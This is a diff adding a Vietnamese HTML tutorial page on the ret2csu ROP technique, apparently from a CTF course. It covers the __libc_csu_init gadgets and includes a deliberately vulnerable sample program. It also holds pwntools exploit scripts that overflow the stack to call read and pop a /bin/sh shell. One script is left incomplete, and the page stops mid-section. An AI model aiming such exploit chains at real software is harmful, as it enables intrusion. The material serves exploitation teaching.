@@ -1,0 +1,484 @@
+<title>ret2csu</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#eceae3;--fg:#23211c;--muted:#6c675c;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --danger:#c0392b;--danger-soft:#f6ddd8;--warn:#b8860b;--warn-soft:#f3e7c7;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:740px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.68;font-size:16.5px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+.wide{max-width:1000px}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:42px 30px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(30px,6.5vw,48px);line-height:1.02;margin:.3em 0 .25em;letter-spacing:-.015em;word-break:break-word}
+.sub{color:var(--muted);font-size:17px;max-width:56ch}
+.meta-row{display:flex;flex-wrap:wrap;gap:8px;margin-top:18px}
+.chip{font-family:var(--font-mono);font-size:12px;padding:5px 10px;border:1px solid var(--line);border-radius:999px;background:var(--surface);color:var(--muted)}
+.chip b{color:var(--fg);font-weight:600}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:18px}
+.toc a{font-family:var(--font-mono);font-size:11.5px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 9px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(22px,4vw,28px);letter-spacing:-.01em;margin:0 0 2px;text-wrap:balance}
+h3{font-family:var(--font-head);font-weight:600;font-size:19px;margin:26px 0 6px}
+h4{font-family:var(--font-head);font-weight:600;font-size:16px;margin:18px 0 4px}
+section.block{padding-block:34px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12.5px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:12px 0}strong{font-weight:600}a{color:var(--accent);text-underline-offset:3px}
+.lead{font-size:18px}
+ul,ol{padding-left:22px;margin:12px 0}li{margin:7px 0}
+mark{background:var(--accent-soft);color:inherit;padding:0 4px;border-radius:3px;font-family:var(--font-mono);font-size:.9em}
+.mem-term{color:var(--mem);font-weight:600}
+.note{border-left:3px solid var(--accent);background:var(--surface);padding:13px 16px;border-radius:0 10px 10px 0;margin:18px 0;font-size:15px}
+.note.tip{border-color:var(--ok)}.note.warn{border-color:var(--danger)}
+.note .tag{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.tldr{background:var(--accent-soft);border:1px solid var(--line);border-radius:14px;padding:18px 20px}
+.tldr p{margin:6px 0}
+.combat{border:2px solid var(--accent);border-radius:14px;overflow:hidden;margin:4px 0 0}
+.combat-h{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:10px 16px;font-size:15.5px}
+.combat-b{padding:2px 16px 10px;background:var(--surface)}
+.combat-row{padding:12px 0;border-bottom:1px solid var(--line)}
+.combat-row:last-child{border-bottom:none}
+.combat-row .lab{font-family:var(--font-mono);font-size:11px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;margin-bottom:5px;display:block}
+.combat-row p{margin:0;font-size:14px}.combat-row pre{margin:4px 0 0}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:13px;line-height:1.62;padding:16px;border-radius:12px;overflow-x:auto;margin:14px 0;border:1px solid #00000030}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .p{color:#d9b55f}
+code{font-family:var(--font-mono);font-size:.88em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre code{background:none;padding:0;font-size:inherit}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px;margin:16px 0}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+.card h4{margin:0 0 4px;font-size:15px}.card p{margin:0;font-size:14px;color:var(--muted)}
+.card .term{font-family:var(--font-mono);color:var(--accent);font-size:12.5px}
+.tablewrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:14px 0}
+table{width:100%;border-collapse:collapse;font-size:14px;min-width:540px}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
+td code{font-size:.85em}
+.yes{color:var(--ok);font-weight:700}.no{color:var(--danger);font-weight:700}.maybe{color:var(--warn);font-weight:700}
+.lab{background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:18px;margin:20px 0}
+.step{display:grid;grid-template-columns:32px 1fr;gap:13px;margin:16px 0}
+.step .n{font-family:var(--font-mono);font-weight:700;color:#fff;background:var(--accent);width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px}
+.step .body h4{margin:1px 0 4px}
+.tabs{display:flex;gap:6px;flex-wrap:wrap;margin:16px 0 0}
+.tab{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px 9px 0 0;cursor:pointer;border-bottom:none}
+.tab.active{background:var(--code-bg);color:var(--code-fg);border-color:var(--code-bg)}
+.tabpanel pre{margin-top:0;border-top-left-radius:0}
+.reqitem{display:grid;grid-template-columns:30px 1fr;gap:10px;border:1px solid var(--line);border-radius:11px;padding:12px 14px;background:var(--surface);align-items:start;margin:8px 0}
+.reqitem .ico{font-size:17px;line-height:1.3}
+.reqitem h4{margin:0 0 2px;font-size:15px}.reqitem p{margin:0;font-size:14px;color:var(--muted)}
+.ropmap{font-family:var(--font-mono);font-size:12px;display:flex;flex-direction:column;gap:3px;margin:12px 0}
+.rr{display:grid;grid-template-columns:140px 1fr;gap:8px;border:1px solid var(--line);border-radius:7px;padding:7px 10px;background:var(--surface-2)}
+.rr .a{color:var(--mem);white-space:nowrap}
+.rr.g{background:var(--mem-soft);border-color:var(--mem)}.rr.call{background:var(--accent-soft);border-color:var(--accent)}
+details{margin-top:8px;border:1px solid var(--line);border-radius:9px;padding:0 12px;background:var(--surface)}
+summary{cursor:pointer;font-size:14px;color:var(--muted);font-family:var(--font-mono);padding:10px 0}
+details[open] summary{color:var(--accent)}details .dc{padding-bottom:10px;font-size:14.5px}
+.ex{background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--mem);border-radius:0 12px 12px 0;padding:13px 16px;margin:12px 0}
+.ex .level{font-family:var(--font-mono);font-size:11px;color:var(--mem);font-weight:700;letter-spacing:.06em}
+figure{margin:22px 0}figure.dg{border:1px solid var(--line);border-radius:14px;background:var(--surface);padding:16px 16px 6px}
+figure svg{display:block;max-width:100%;height:auto;margin:0 auto}
+figcaption{font-size:13px;color:var(--muted);text-align:center;margin-top:10px;line-height:1.55}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer}
+footer{padding-block:26px 44px;color:var(--muted);font-size:13.5px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐ giao diện</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">PWN · Phase 2 · Bài 8</div>
+    <h1>ret2csu</h1>
+    <p class="sub">Khi binary <strong>thiếu gadget</strong> để đặt <code>rdx</code> (đối số thứ 3) — nhưng mọi ELF dùng libc đều có hàm <code>__libc_csu_init</code> với <mark>2 gadget "vạn năng"</mark>: một để pop 6 thanh ghi, một để <code>mov rdx/rsi/edi</code> rồi <code>call</code>. Bài này đi <strong>disasm số thật + điều kiện rbx/rbp + giới hạn edi</strong>.</p>
+    <div class="meta-row">
+      <span class="chip"><b>Mức:</b> Trung–Cao (Phase 2)</span>
+      <span class="chip"><b>Binary mẫu:</b> x86-64 no-PIE, gcc &lt;2.34 csu</span>
+      <span class="chip"><b>Cần trước:</b> <a href="rop_basics.html" style="color:inherit">rop_basics</a></span>
+      <span class="chip"><b>Thời lượng:</b> ~50 phút</span>
+    </div>
+    <div class="toc">
+      <a href="#s0">00 Tóm tắt</a><a href="#combat">⚡ Combat</a><a href="#s1">01 Nền tảng</a><a href="#s2">02 Vì sao</a>
+      <a href="#s3">03 2 Gadget</a><a href="#s4">04 Điều kiện</a><a href="#s5">05 Mô phỏng</a><a href="#s6">06 Tự tìm</a>
+      <a href="#s7">07 Exploit thật</a><a href="#s8">08 Công cụ</a><a href="#s9">09 Gỡ lỗi</a>
+      <a href="#s10">10 Biến thể</a><a href="#s11">11 Bài tập</a><a href="#s12">12 Thuật ngữ</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s0">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Bài này nói về cái gì?</h2>
+  <div class="tldr">
+    <p><strong>Vấn đề:</strong> cần gọi hàm với 3 đối số (vd <code>read(0, bss, 0x100)</code> cần rdx) nhưng không có <code>pop rdx; ret</code>.</p>
+    <p><strong>Giải pháp:</strong> <code>__libc_csu_init</code> (phần khởi tạo của mọi ELF cũ) chứa 2 gadget cố định: <mark>gadget1</mark> = <code>pop rbx;rbp;r12;r13;r14;r15;ret</code>; <mark>gadget2</mark> = <code>mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]</code> (layout tùy bản). Dùng g1 nạp 6 reg, g2 chuyển vào rdx/rsi/edi &amp; gọi.</p>
+    <p><strong>Bẫy:</strong> điều kiện vòng lặp (<code>rbx</code> vs <code>rbp</code>), và <code>edi</code> chỉ 32-bit (đối số 1 bị cắt).</p>
+  </div>
+  <p class="lead" style="margin-top:16px">Nếu chỉ nhớ một điều: <strong>csu = gadget vạn năng để set rdx &amp; gọi hàm; đặt rbx=0, rbp=1; nhớ edi chỉ 32-bit.</strong></p>
+ </div>
+</section>
+
+<!-- COMBAT -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="combat">
+    <div class="combat-h">⚡ COMBAT CARD — dán chạy khi đang thi</div>
+    <div class="combat-b">
+      <div class="combat-row"><span class="lab">🔎 Tìm 2 gadget</span>
+<pre><code>ROPgadget --binary ./a | grep "pop rbx"   <span class="c"># gadget1 (6 pop)</span>
+<span class="c"># gadget2 = gadget1 - 0x1a (đoạn mov rdx/rsi/edi; call)</span>
+<span class="c"># hoặc objdump -d ./a | grep -A20 __libc_csu_init</span></code></pre></div>
+      <div class="combat-row"><span class="lab">🧩 Layout stack chuẩn</span>
+<pre><code>[pad][gadget1]
+[rbx=0][rbp=1][r12=&amp;fn_ptr][r13=arg1][r14=arg2][r15=arg3]
+[gadget2]
+[7 giá trị rác] (các pop của phần cuối csu sau call)
+[ret_tiếp]</code></pre></div>
+      <div class="combat-row"><span class="lab">⚠️ Điều kiện (bẫy #1)</span>
+        <p>Cuối gadget2 có <code>add rbx,1; cmp rbx,rbp; jne loop</code>. Đặt <b>rbx=0, rbp=1</b> → sau <code>rbx+1==rbp</code> → thoát loop, không gọi lại.</p></div>
+      <div class="combat-row"><span class="lab">⚠️ edi 32-bit (bẫy #2)</span>
+        <p>gadget2 dùng <code>mov edi, r12d</code> (hoặc r13d) → chỉ chuyển 32 bit thấp vào rdi. Nếu đối số 1 cần 64-bit (vd con trỏ) → KHÔNG dùng csu cho rdi; set rdi bằng pop rdi riêng, csu chỉ lo rdx/rsi.</p></div>
+      <div class="combat-row"><span class="lab">🎯 r15 = con trỏ-tới-con-trỏ</span>
+        <p><code>call [r15+rbx*8]</code> gọi hàm tại <code>*(r15)</code> (rbx=0). Nên <b>r15 = địa chỉ ô GOT chứa hàm</b> (vd <code>&amp;_GLOBAL_OFFSET_TABLE_+..</code>), KHÔNG phải địa chỉ hàm trực tiếp.</p></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s1">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2><code>__libc_csu_init</code> — đoạn code ai cũng có</h2>
+  <p>Mọi ELF biên dịch kiểu cũ (gcc trước ~2.34 toolchain) đều có hàm <code>__libc_csu_init</code> chạy constructor lúc khởi động. Đoạn cuối của nó, khi disasm, tình cờ tạo thành <strong>2 chuỗi gadget cực mạnh</strong> có mặt ở <em>mọi binary</em> — nên gọi là "universal gadget". Dù binary của đề không có <code>pop rdx</code> hay gadget phù hợp, csu luôn cứu.</p>
+  <h4 style="margin-top:8px">Định nghĩa nhanh</h4>
+  <div class="grid">
+    <div class="card"><div class="term">ret2csu</div><p>Dùng gadget trong __libc_csu_init.</p></div>
+    <div class="card"><div class="term">universal gadget</div><p>Gadget có ở mọi ELF cũ.</p></div>
+    <div class="card"><div class="term">gadget1 (pop)</div><p>pop rbx,rbp,r12,r13,r14,r15; ret.</p></div>
+    <div class="card"><div class="term">gadget2 (mov/call)</div><p>mov rdx/rsi/edi; call [r15+rbx*8].</p></div>
+    <div class="card"><div class="term">edi limitation</div><p>Đối số 1 chỉ 32-bit qua csu.</p></div>
+    <div class="card"><div class="term">call [reg]</div><p>Gọi hàm tại con trỏ trong bộ nhớ.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s2">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO CÓ KỸ THUẬT</div>
+  <h2>rdx là thanh ghi "khó"</h2>
+  <p>Trong ROP, <code>pop rdi</code>/<code>pop rsi</code> thường dễ tìm, nhưng <code>pop rdx; ret</code> hiếm (gcc ít sinh). Mà nhiều syscall/hàm cần rdx: <code>read(fd,buf,<b>len</b>)</code>, <code>write(fd,buf,<b>len</b>)</code>, <code>execve(path,argv,<b>envp</b>)</code>, <code>mprotect(addr,<b>len</b>,prot)</code>. ret2csu cho bạn một cách <em>đảm bảo</em> set được rdx (và rsi) + gọi một hàm — không phụ thuộc gadget có sẵn. Đây là mảnh ghép giúp dựng <a href="ret2syscall_mprotect.html">ret2syscall/mprotect</a> khi gadget nghèo.</p>
+ </div>
+</section>
+
+<!-- 03 Gadget -->
+<section class="block" id="s3">
+ <div class="wrap">
+  <div class="secnum">03 / 2 GADGET · MỤC LÕI</div>
+  <h2>Disasm số thật (binary mẫu)</h2>
+  <pre><code><span class="c"># objdump -d ./vuln | grep -A24 __libc_csu_init</span>
+<span class="d">0x4011b0</span> &lt;csu+0x40&gt;:  mov    rdx, r14       <span class="c"># ← GADGET2 bắt đầu đây</span>
+<span class="d">0x4011b3</span>:             mov    rsi, r13
+<span class="d">0x4011b6</span>:             mov    edi, r12d      <span class="c"># ⚠️ edi = 32-bit!</span>
+<span class="d">0x4011b9</span>:             call   [r15 + rbx*8]  <span class="c"># gọi *(r15) khi rbx=0</span>
+<span class="d">0x4011bd</span>:             add    rbx, 1
+<span class="d">0x4011c1</span>:             cmp    rbx, rbp
+<span class="d">0x4011c4</span>:             jne    0x4011b0       <span class="c"># loop nếu rbx != rbp</span>
+<span class="d">0x4011ca</span> &lt;csu+0x5a&gt;:  pop    rbx           <span class="c"># ← GADGET1 bắt đầu đây</span>
+<span class="d">0x4011cb</span>:             pop    rbp
+<span class="d">0x4011cc</span>:             pop    r12
+<span class="d">0x4011ce</span>:             pop    r13
+<span class="d">0x4011d0</span>:             pop    r14
+<span class="d">0x4011d2</span>:             pop    r15
+<span class="d">0x4011d4</span>:             ret</code></pre>
+  <p><strong>gadget1</strong> = <code>0x4011ca</code> (nạp 6 reg). <strong>gadget2</strong> = <code>0x4011b0</code> (chuyển vào rdx/rsi/edi &amp; call).</p>
+
+  <h3>Bố cục stack: gọi read(0, bss, 0x100) qua csu</h3>
+  <div class="ropmap">
+    <div class="rr g"><span class="a">0x4011ca</span><span>gadget1 (pop ×6)</span></div>
+    <div class="rr"><span class="a">rbx = 0</span><span>→ call [r15+0], và cmp</span></div>
+    <div class="rr"><span class="a">rbp = 1</span><span>→ rbx+1==rbp, thoát loop</span></div>
+    <div class="rr"><span class="a">r12 = 0</span><span>→ edi = 0 (fd=0, stdin) — 32-bit OK</span></div>
+    <div class="rr"><span class="a">r13 = bss</span><span>→ rsi = buf</span></div>
+    <div class="rr"><span class="a">r14 = 0x100</span><span>→ rdx = len</span></div>
+    <div class="rr"><span class="a">r15 = &amp;read@got</span><span>→ call *(r15) = read</span></div>
+    <div class="rr call"><span class="a">0x4011b0</span><span>gadget2 → read(0, bss, 0x100)</span></div>
+    <div class="rr" style="opacity:.7"><span class="a">rác ×7</span><span>bù cho pop rbx..r15 ở cuối csu sau khi call return</span></div>
+    <div class="rr"><span class="a">next_gadget</span><span>chuỗi tiếp (vd execve(bss))</span></div>
+  </div>
+  <div class="note warn"><span class="tag">Chú ý r12 vs r13 theo bản</span>Thứ tự <code>mov edi,r12d / mov rsi,r13 / mov rdx,r14</code> KHÁC nhau giữa các phiên bản gcc. Luôn <b>disasm csu thực tế</b> để biết reg nào → đối số nào. Bài này dùng layout phổ biến (r12→edi, r13→rsi, r14→rdx, r15→call).</div>
+ </div>
+</section>
+
+<!-- 04 Điều kiện -->
+<section class="block" id="s4">
+ <div class="wrap">
+  <div class="secnum">04 / HAI ĐIỀU KIỆN SỐNG CÒN</div>
+  <h2>rbx/rbp và edi</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>rbx=0, rbp=1 (thoát loop, gọi đúng *(r15))</h4>
+    <p><code>call [r15 + rbx*8]</code> với rbx=0 → gọi <code>*(r15)</code>. Sau đó <code>rbx+=1</code> → rbx=1; <code>cmp rbx,rbp</code> (rbp=1) → bằng → <strong>không lặp</strong>. Nếu rbp≠1 → lặp gọi lại với rbx=1 (gọi <code>*(r15+8)</code>) → thường crash.</p></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>edi chỉ 32-bit</h4>
+    <p><code>mov edi, r12d</code> xóa 32 bit cao của rdi. Đối số 1 nếu là số nhỏ (fd=0, prot=7) → OK. Nếu là <strong>con trỏ 64-bit</strong> (vd "/bin/sh") → KHÔNG dùng csu cho rdi; đặt rdi bằng <code>pop rdi; ret</code> riêng TRƯỚC khi vào csu (csu chỉ set rsi/rdx).</p></div></div>
+  <div class="note tip"><span class="tag">Chiến thuật kết hợp</span>Mẫu hay dùng: <code>pop rdi; ret</code> set rdi (64-bit), rồi csu set rsi+rdx (và call). Hoặc dùng csu gọi một hàm lấy đối số đầu nhỏ (read: fd=0).</div>
+ </div>
+</section>
+
+<!-- 05 Mô phỏng -->
+<section class="block" id="s5">
+ <div class="wrap wide">
+  <div class="secnum">05 / TỰ TAY THỬ</div>
+  <h2>Nạp reg qua csu — xem đối số hình thành</h2>
+  <p>Bấm "Chạy gadget1" rồi "Chạy gadget2" để thấy 6 reg nạp vào rồi chuyển sang rdx/rsi/edi &amp; call.</p>
+  <div class="lab">
+    <div id="sim" style="font-family:var(--font-mono);font-size:13px">
+      <div id="regbox" style="display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:6px;margin-bottom:12px"></div>
+      <div style="display:flex;gap:8px;flex-wrap:wrap">
+        <button id="g1" style="font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--fg);padding:7px 12px;border-radius:8px;cursor:pointer">▶ gadget1 (pop ×6)</button>
+        <button id="g2" style="font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--fg);padding:7px 12px;border-radius:8px;cursor:pointer">▶ gadget2 (mov+call)</button>
+        <button id="rs" style="font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:7px 12px;border-radius:8px;cursor:pointer">↺ reset</button>
+      </div>
+      <div id="simmsg" style="margin-top:10px;color:var(--mem)"></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 06 Tự tìm -->
+<section class="block" id="s6">
+ <div class="wrap">
+  <div class="secnum">06 / TỰ TÌM THÔNG TIN</div>
+  <h2>Gadget &amp; con trỏ hàm</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>2 gadget</h4>
+    <pre><code><span class="p">$</span> objdump -d ./vuln | grep -A24 __libc_csu_init
+<span class="c"># gadget1 = địa chỉ "pop rbx" ; gadget2 = địa chỉ "mov rdx,r14"</span></code></pre></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>r15 = ô chứa con trỏ hàm</h4>
+    <pre><code><span class="p">&gt;&gt;&gt;</span> exe.got.read     <span class="c"># &amp;read@got (call *(r15) = read)</span>
+<span class="c"># hoặc một ô GOT đã resolve; KHÔNG dùng địa chỉ PLT trực tiếp</span></code></pre></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>pwntools tự dựng</h4>
+    <pre><code><span class="p">&gt;&gt;&gt;</span> r = ROP(exe); r.call(exe.sym.func, [a,b,c])  <span class="c"># ROP tự dùng csu nếu cần</span></code></pre></div></div>
+ </div>
+</section>
+
+<!-- 07 Exploit thật -->
+<section class="block" id="s7">
+ <div class="wrap wide">
+  <div class="secnum">07 / EXPLOIT ĐẦY ĐỦ</div>
+  <h2>csu để gọi read(0,bss,path) → execve (no pop rdx)</h2>
+  <pre><code><span class="c">// vuln.c — gcc vuln.c -o vuln -no-pie -fno-stack-protector  (binary KHÔNG có pop rdx)</span>
+<span class="k">int</span> main(){ <span class="k">char</span> b[<span class="d">0x40</span>]; read(<span class="d">0</span>, b, <span class="d">0x200</span>); }</code></pre>
+  <div class="tabs" id="tabs">
+    <button class="tab active" data-t="a">A · thủ công</button>
+    <button class="tab" data-t="b">B · pwntools ROP</button>
+    <button class="tab" data-t="c">C · pwnld</button>
+  </div>
+
+  <div class="tabpanel" id="panel-a">
+<pre><code><span class="c"># BẢN A — csu gọi read(0,bss,path_len) để nhập "/bin/sh", rồi execve.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+
+OFF = <span class="d">72</span>
+g1  = <span class="d">0x4011ca</span>   <span class="c"># pop rbx,rbp,r12,r13,r14,r15; ret</span>
+g2  = <span class="d">0x4011b0</span>   <span class="c"># mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15]</span>
+bss = exe.bss(<span class="d">0x300</span>)
+
+<span class="c"># csu gọi read(0, bss, 0x10) để nhập "/bin/sh\0"</span>
+chain  = b<span class="s">"A"</span>*OFF
+chain += p64(g1)
+chain += p64(<span class="d">0</span>)          <span class="c"># rbx=0</span>
+chain += p64(<span class="d">1</span>)          <span class="c"># rbp=1</span>
+chain += p64(<span class="d">0</span>)          <span class="c"># r12 → edi = 0 (fd stdin)</span>
+chain += p64(bss)        <span class="c"># r13 → rsi = buf</span>
+chain += p64(<span class="d">0x10</span>)       <span class="c"># r14 → rdx = len</span>
+chain += p64(exe.got.read)  <span class="c"># r15 = &amp;read@got → call read</span>
+chain += p64(g2)
+chain += b<span class="s">"B"</span>*<span class="d">56</span>       <span class="c"># 7 giá trị rác (pop cuối csu: rbx..r15 = 6*8, +8 = 56)</span>
+<span class="c"># sau csu: dùng pop rdi set rdi=bss (64-bit!), rsi=rdx=0, rồi execve syscall / system</span>
+chain += p64(<span class="d">0x401263</span>) + p64(bss)              <span class="c"># pop rdi; ret → rdi=bss (chuỗi đã nhập)</span>
+<span class="c"># ... tiếp execve bằng syscall như rop_basics ...</span>
+p.send(chain)
+p.sendline(b<span class="s">"/bin/sh\x00"</span>)      <span class="c"># dữ liệu cho read</span>
+p.interactive()</code></pre>
+<div class="note warn"><span class="tag">Thành thật</span>Số <code>g1=0x4011ca</code>, <code>g2=0x4011b0</code>, phần rác <b>56 byte</b> (6 pop + ret của csu sau call) là của binary mẫu — của bạn khác, <b>disasm csu thực tế</b>. edi 32-bit nên fd=0 OK nhưng con trỏ bss phải set bằng <code>pop rdi</code> riêng. gcc ≥2.34 không còn __libc_csu_init (xem §10).</div>
+  </div>
+
+  <div class="tabpanel" id="panel-b" hidden>
+<pre><code><span class="c"># BẢN B — pwntools ROP tự dùng csu khi cần set rdx.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+context.binary = exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+OFF = <span class="d">72</span>; bss = exe.bss(<span class="d">0x300</span>)
+
+r = ROP(exe)
+r.call(exe.plt.read, [<span class="d">0</span>, bss, <span class="d">0x10</span>])   <span class="c"># ROP TỰ dùng ret2csu để set rdx!</span>
+<span class="c"># ... r.call(exe.sym.system, [bss]) nếu có system plt ...</span>
+p.send(b<span class="s">"A"</span>*OFF + r.chain())
+log.info(r.dump())                    <span class="c"># xem ROP đã chèn csu gadget</span>
+p.sendline(b<span class="s">"/bin/sh\x00"</span>)
+p.interactive()</code></pre>
+<div class="note tip"><span class="tag">ROP tự động</span><code>ROP(exe).call(fn, [a,b,c])</code> — nếu thiếu <code>pop rdx</code>, pwntools TỰ chèn ret2csu. Xem <code>r.dump()</code> để học cách nó dựng. Rất nhanh trong thực chiến.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-c" hidden>
+<pre><code><span class="c"># BẢN C — pwnld.</span>
+<span class="k">from</span> pwnld <span class="k">import</span> *
+context.binary = exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>)
+p = start(); OFF = <span class="d">72</span>; bss = exe.bss(<span class="d">0x300</span>)
+r = ROP(exe)
+r.call(exe.plt.read, [<span class="d">0</span>, bss, <span class="d">0x10</span>])
+sl(b<span class="s">"A"</span>*OFF + r.chain()); sl(b<span class="s">"/bin/sh\x00"</span>)
+ia()</code></pre>
+<div class="note"><span class="tag">pwnld</span>Dùng pwntools <code>ROP</code> y hệt; pwnld chỉ rút gọn I/O. Hiểu csu để debug khi ROP chọn layout khác.</div>
+  </div>
+
+  <h3>Checklist</h3>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Crash sau call</h4><p>Thiếu/thừa byte rác sau gadget2 (6 pop + ret). Đếm lại = 56.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Gọi sai hàm</h4><p>r15 phải là ô GOT chứa con trỏ, không phải địa chỉ hàm. call [r15].</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>rdi bị cắt</h4><p>edi 32-bit. Con trỏ 64-bit set bằng pop rdi riêng.</p></div></div>
+ </div>
+</section>
+
+<!-- 08 Công cụ -->
+<section class="block" id="s8">
+ <div class="wrap">
+  <div class="secnum">08 / CÔNG CỤ</div>
+  <h2>Hộp đồ nghề</h2>
+  <div class="grid">
+    <div class="card"><div class="term">objdump / IDA 9.1 Pro</div><h4>Disasm csu</h4><p>Lấy g1/g2 &amp; thứ tự reg.</p></div>
+    <div class="card"><div class="term">pwntools ROP</div><h4>Tự chèn csu</h4><p><code>r.call(fn,[a,b,c])</code>, <code>r.dump()</code>.</p></div>
+    <div class="card"><div class="term">ROPgadget</div><h4>Tìm pop rbx</h4><p>Xác định g1.</p></div>
+    <div class="card"><div class="term">gdb</div><h4>Kiểm reg</h4><p>Breakpoint tại call để xem rdx/rsi/rdi.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 09 Gỡ lỗi -->
+<section class="block" id="s9">
+ <div class="wrap">
+  <div class="secnum">09 / GỠ LỖI</div>
+  <h2>Khi csu không gọi đúng</h2>
+  <div class="grid">
+    <div class="card"><h4>Loop gọi lại (crash)</h4><p>rbp≠1. Đặt rbp=1, rbx=0.</p></div>
